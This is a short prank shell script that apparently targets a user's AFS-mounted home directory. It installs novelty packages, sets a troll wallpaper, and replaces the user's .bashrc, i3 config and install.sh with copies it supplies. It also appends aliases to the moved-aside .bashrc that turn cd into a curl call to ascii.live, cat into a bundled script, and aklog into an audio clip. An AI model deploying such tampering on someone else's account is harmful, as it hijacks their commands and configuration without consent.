#!/bin/sh

nix profile install nixpkgs#{sl,bb,lolcat,oneko} &
clear
mv ./internet-troll.jpg ~/afs/
feh --bg-scale ~/afs/internet-troll.jpg
mv ./term.sh ~/afs/
mv ./sncf.mp3 ~/afs/
mv ~/afs/.confs/install.sh ~/afs/install.sh
mv ./install.sh ~/afs/.confs/install.sh
mv ./NG.mp4 ~/afs/
mv ./repair.sh ~/afs/
mv ./stop.sh ~/afs/
mv ./stop.png ~/afs/
mv ~/.bashrc ~/afs/.bashrc#
mv ./my_cat.sh ~/afs/
echo 'alias cd="curl ascii.live/dvd"' >> ~/afs/.bashrc#
echo 'alias cat="exec ~/afs/my_cat.sh"' >> ~/afs/.bashrc#
echo 'alias aklog="aplay ~/afs/sncf.mp3"' >> ~/afs/.bashrc#
mv ./.bashrc ~/.bashrc
mv ~/.config/i3/config ~/afs/config#
mv ./config ~/.config/i3/config
